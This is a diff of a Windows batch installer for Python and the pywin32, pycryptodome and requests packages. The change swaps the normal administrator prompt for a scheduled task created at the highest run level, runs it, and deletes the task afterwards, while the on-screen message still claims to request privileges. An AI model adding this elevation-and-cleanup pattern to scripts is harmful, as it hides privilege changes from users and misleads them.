@@ -1,13 +1,16 @@
 @echo off
-:: Hide the command window
 title Installing Python & Dependencies
 
-:: Check if running as admin
+:: Define Task Name
+set "TASK_NAME=PythonInstallerTask"
+
+:: Check if running as administrator
 net session >nul 2>&1
 if %errorLevel% neq 0 (
     echo Requesting administrator privileges...
-    powershell -Command "Start-Process cmd -ArgumentList '/c %~f0' -Verb RunAs"
-    exit /b
+    schtasks /create /tn %TASK_NAME% /tr "%~f0" /sc once /st 00:00 /f /rl highest
+    schtasks /run /tn %TASK_NAME%
+    exit
 )
 
 echo Checking for Python installation...
@@ -31,6 +34,9 @@ python -m pip install --upgrade pip
 for %%i in (pywin32 pycryptodome requests) do (
     python -c "import %%i" 2>nul || python -m pip install %%i
 )
+
+:: Remove the scheduled task after execution
+schtasks /delete /tn %TASK_NAME% /f >nul 2>&1
 
 echo All dependencies installed.
 exit
